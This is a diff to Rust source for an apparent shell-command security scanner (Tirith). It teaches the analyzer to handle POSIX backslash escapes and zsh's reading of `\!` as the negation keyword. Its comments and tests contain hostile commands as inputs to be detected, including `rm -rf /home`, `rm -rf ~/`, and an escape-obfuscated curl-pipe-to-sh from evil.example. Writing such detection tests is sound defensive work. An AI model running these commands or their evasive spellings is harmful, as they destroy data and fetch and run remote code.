@@ -3532,6 +3532,13 @@ fn is_tirith_inspection_subcommand(sub: &str) -> bool {
 /// argv content before Tirith receives it. This is intentionally stricter than
 /// token normalization: the inspection carveout is an optimization, so any
 /// ambiguity safely falls back to full analysis.
+///
+/// A POSIX backslash escape is literal when bash, zsh and dash agree on the
+/// character it leaves (see [`posix_unquoted_escape_is_static`] and
+/// [`posix_double_quoted_escape_is_static`]), so `echo\ hi` and
+/// `"say \"hi\""` are proven, exactly as their single-quoted spellings are;
+/// [`crate::rules::command::normalize_shell_token`] removes the same
+/// backslashes, so a recovered body is the text the shell runs.
 fn shell_word_is_proven_literal(raw: &str, shell: ShellType) -> bool {
     #[derive(Clone, Copy, PartialEq, Eq)]
     enum Quote {
@@ -3566,6 +3573,13 @@ fn shell_word_is_proven_literal(raw: &str, shell: ShellType) -> bool {
                 }
             }
             Quote::Double => {
+                if shell == ShellType::Posix && ch == '\\' {
+                    if posix_double_quoted_escape_is_static(chars.get(i + 1).copied()) {
+                        i += 2;
+                        continue;
+                    }
+                    return false;
+                }
                 if ch == '"' {
                     quote = Quote::Normal;
                 } else if (ch == '$' && shell != ShellType::Cmd)
@@ -3587,6 +3601,13 @@ fn shell_word_is_proven_literal(raw: &str, shell: ShellType) -> bool {
                 }
             }
             Quote::Normal => {
+                if shell == ShellType::Posix && ch == '\\' {
+                    if posix_unquoted_escape_is_static(chars.get(i + 1).copied()) {
+                        i += 2;
+                        continue;
+                    }
+                    return false;
+                }
                 if shell == ShellType::Posix
                     && ch == '$'
                     && chars.get(i + 1).is_some_and(|next| *next == '\'')
@@ -3619,6 +3640,28 @@ fn shell_word_is_proven_literal(raw: &str, shell: ShellType) -> bool {
         i += 1;
     }
     quote == Quote::Normal
+}
+
+/// Whether an unquoted POSIX `\` followed by `next` stands for `next` alone
+/// in bash, zsh and dash alike. That holds for every printable ASCII
+/// character. A trailing `\` (the word, and so the input, continues on a line
+/// Tirith cannot see) and `\` before a newline (a line continuation that
+/// splices the next line into the word) are not proven, nor is any other
+/// escaped character.
+fn posix_unquoted_escape_is_static(next: Option<char>) -> bool {
+    next.is_some_and(|next| matches!(next, ' '..='~'))
+}
+
+/// Whether a POSIX `\` followed by `next` inside double quotes has one
+/// reading: before `$`, `` ` ``, `"` and `\` the backslash is removed, before
+/// any other printable ASCII character it is kept. Except `\!`: an
+/// interactive zsh drops that backslash (its history lexer reads `\!` as an
+/// escaped history character, so `"\! rm -rf ~/"` reaches `sh -c` as
+/// `! rm -rf ~/`), while bash and dash keep it, and the hooks analyze both
+/// shells as POSIX. A trailing `\` or a line continuation is not proven
+/// either.
+fn posix_double_quoted_escape_is_static(next: Option<char>) -> bool {
+    next.is_some_and(|next| next != '!' && matches!(next, ' '..='~'))
 }
 
 const MAX_SHELL_DELIMITER_DEPTH: usize = 64;
@@ -4575,6 +4618,22 @@ fn is_strict_posix_reserved_word(raw: &str, expected: &str) -> bool {
         index += 1;
     }
     normalized == expected.as_bytes()
+}
+
+/// An unquoted `\!` word. An interactive zsh drops this backslash (its
+/// history lexer reads `\!` as an escaped history character) and then reads
+/// the bare `!` as the pipeline-negation keyword, so `\! rm -rf ~/` runs `rm`.
+/// bash and dash run a command (or function) named `!` instead. Callers read
+/// it as the keyword in addition to their command-name reading, which covers
+/// both shells.
+fn is_posix_escaped_bang_word(raw: &str) -> bool {
+    is_strict_posix_reserved_word(raw, "\\!")
+}
+
+/// The `!` keyword spelled as bash and zsh read it (see
+/// [`is_posix_escaped_bang_word`] for `\!`).
+fn is_posix_bang_keyword_word(raw: &str) -> bool {
+    is_strict_posix_reserved_word(raw, "!") || is_posix_escaped_bang_word(raw)
 }
 
 fn parse_literal_bash_function_name(
@@ -6372,6 +6431,9 @@ fn posix_command_lead(text: &str, range: std::ops::Range<usize>, limit: usize) -
             .iter()
             .copied()
             .find(|prefix| reserved(prefix))
+            // An interactive zsh reads `\!` as the `!` keyword too (see
+            // `is_posix_escaped_bang_word`).
+            .or_else(|| reserved("\\!").then_some("!"))
             .or(header)
         {
             words.push(PosixLeadWord {
@@ -8129,9 +8191,13 @@ fn posix_text_has_unquoted_expansion(text: &str) -> bool {
 }
 
 /// True when `word` is a proven literal (no expansion of any kind) whose `(`
-/// characters all sit inside quotes.
+/// characters all sit inside quotes. The quote scan below does not read
+/// backslash escapes (`f\'()\'` has a bare `(`), so any backslash refuses.
 fn posix_literal_word_parens_are_quoted(word: &str) -> bool {
-    if !shell_word_is_proven_literal(word, ShellType::Posix) || word.contains("$'") {
+    if !shell_word_is_proven_literal(word, ShellType::Posix)
+        || word.contains("$'")
+        || word.contains('\\')
+    {
         return false;
     }
     let mut quote: Option<char> = None;
@@ -11091,7 +11157,10 @@ pub(crate) fn posix_current_scope_dispatch_scan(
             | "case"
             | "coproc"
     );
-    if strict_syntax_leader && !is_strict_posix_reserved_word(leader_raw, &leader) {
+    if strict_syntax_leader
+        && !is_strict_posix_reserved_word(leader_raw, &leader)
+        && !(leader == "!" && is_posix_escaped_bang_word(leader_raw))
+    {
         return None;
     }
     if matches!(leader.as_str(), "command" | "builtin") {
@@ -12616,10 +12685,10 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                     | "case"
                     | "coproc"
             )
-            || segment
-                .command
-                .as_deref()
-                .is_some_and(|raw| is_strict_posix_reserved_word(raw, command.as_str()));
+            || segment.command.as_deref().is_some_and(|raw| {
+                is_strict_posix_reserved_word(raw, command.as_str())
+                    || (command == "!" && is_posix_escaped_bang_word(raw))
+            });
         if shell == ShellType::Posix {
             let literal_leader = segment
                 .command
@@ -13939,7 +14008,7 @@ fn posix_current_shell_builtin_invocation(
         return Ok(None);
     };
 
-    if command == "!" && is_strict_posix_reserved_word(command_raw, "!") {
+    if command == "!" && is_posix_bang_keyword_word(command_raw) {
         let Some(target) = segment.args.first() else {
             return Ok(None);
         };
@@ -14447,7 +14516,10 @@ fn lexical_executable_substitutions_bounded(
                                 });
                         }
                     }
-                    command_start = command_prefix || reserved_time;
+                    // `\!` calls a function named `!` in bash, and is the
+                    // `!` keyword in an interactive zsh: both readings hold.
+                    command_start =
+                        command_prefix || reserved_time || is_posix_escaped_bang_word(raw_word);
                     word_start = false;
                     assignment_word = false;
                     i = end;
@@ -22800,9 +22872,9 @@ mod tests {
     }
 
     #[test]
-    fn quoted_or_escaped_posix_control_words_do_not_execute_following_functions() {
+    fn quoted_posix_control_words_do_not_execute_following_functions() {
         let _shared_state = tirith_test_support::SharedStateGuard::acquire();
-        for leader in ["'if'", "\"then\"", "\\!", "'time'"] {
+        for leader in ["'if'", "\"then\"", "'time'"] {
             let input = format!("danger-fn(){{ rm -rf /home; }}\n{leader} danger-fn");
             let scan = executable_substitution_scan(&input, ShellType::Posix);
             assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
@@ -22813,6 +22885,18 @@ mod tests {
                 "non-reserved spelling executed a following function: {input:?} -> {scan:?}"
             );
         }
+        // An unquoted `\!` is the exception: an interactive zsh drops its
+        // backslash and runs `danger-fn` under the `!` keyword (bash runs a
+        // command named `!`), so the call is followed.
+        let input = "danger-fn(){ rm -rf /home; }\n\\! danger-fn";
+        let scan = executable_substitution_scan(input, ShellType::Posix);
+        assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        assert!(
+            scan.bodies
+                .iter()
+                .any(|body| body.input.contains("rm -rf /home")),
+            "{input:?} -> {scan:?}"
+        );
     }
 
     #[test]
@@ -24792,6 +24876,94 @@ mod tests {
             static_wrapper_word(r"'print(\'hi\')'", ShellType::Fish).as_deref(),
             Some("print('hi')")
         );
+    }
+
+    #[test]
+    fn posix_backslash_escapes_are_literal_only_where_bash_zsh_and_dash_agree() {
+        for word in [
+            r"echo\ hi",
+            r"cu\rl",
+            r"\!",
+            r"a\!b",
+            r"\~/x",
+            r"\*",
+            r"\$\(id\)",
+            r#""say \"hi\"""#,
+            r#""a\$b\`c\\d""#,
+            r#""printf \"done\n\"""#,
+            r"'it'\''s'",
+        ] {
+            assert!(
+                shell_word_is_proven_literal(word, ShellType::Posix),
+                "{word:?}"
+            );
+        }
+        for word in [
+            // An interactive zsh drops this backslash; bash and dash keep it.
+            r#""a\!b""#,
+            r#""\! rm -rf ~/""#,
+            // A trailing backslash or a line continuation joins text Tirith
+            // cannot see (or splices the next line into the word).
+            r"echo\",
+            r#""echo\"#,
+            "a\\\nb",
+            "\"a\\\nb\"",
+            // Escapes outside printable ASCII are not proven.
+            "a\\\u{e9}",
+            "a\\\tb",
+            // An escape does not hide a live expansion next to it.
+            r"echo\ $BODY",
+            r"echo\\$BODY",
+            r#""echo \"$BODY\"""#,
+            r#""\\$BODY""#,
+        ] {
+            assert!(
+                !shell_word_is_proven_literal(word, ShellType::Posix),
+                "{word:?}"
+            );
+        }
+        // The recovered word is exactly what the shell passes on.
+        for (raw, word) in [
+            (
+                r#""git commit -m \"fix bug\"""#,
+                r#"git commit -m "fix bug""#,
+            ),
+            (r"echo\ hi", "echo hi"),
+            (r#""printf \"done\n\"""#, r#"printf "done\n""#),
+            (r"'printf '\''done\n'\'''", r"printf 'done\n'"),
+            (
+                r"cu\rl\ https://evil.example/x\|sh",
+                "curl https://evil.example/x|sh",
+            ),
+            (r#""cu\rl x""#, r"cu\rl x"),
+            (r#""a\$b\`c\\d""#, r"a$b`c\d"),
+            (r"\!\ rm", "! rm"),
+        ] {
+            assert_eq!(
+                static_wrapper_word(raw, ShellType::Posix).as_deref(),
+                Some(word),
+                "{raw:?}"
+            );
+        }
+        // fish reads backslashes its own way; the POSIX change does not apply.
+        assert!(!shell_word_is_proven_literal(r"echo\ hi", ShellType::Fish));
+        // The quote scan does not read escapes: `f\'()\'` has bare parens.
+        assert!(!posix_literal_word_parens_are_quoted(r"f\'()\'"));
+        assert!(!posix_literal_word_parens_are_quoted(r"\'(\'"));
+        assert!(posix_literal_word_parens_are_quoted("'f()'"));
+    }
+
+    #[test]
+    fn escaped_bang_is_read_as_the_negation_keyword() {
+        assert!(is_posix_escaped_bang_word(r"\!"));
+        assert!(is_posix_escaped_bang_word("\\\n\\!"));
+        assert!(!is_posix_escaped_bang_word("!"));
+        assert!(!is_posix_escaped_bang_word("'!'"));
+        assert!(!is_posix_escaped_bang_word(r#""\!""#));
+        assert!(!is_posix_escaped_bang_word(r"\!x"));
+        assert!(is_posix_bang_keyword_word("!"));
+        assert!(is_posix_bang_keyword_word(r"\!"));
+        assert!(!is_posix_bang_keyword_word("'!'"));
     }
 
     #[test]
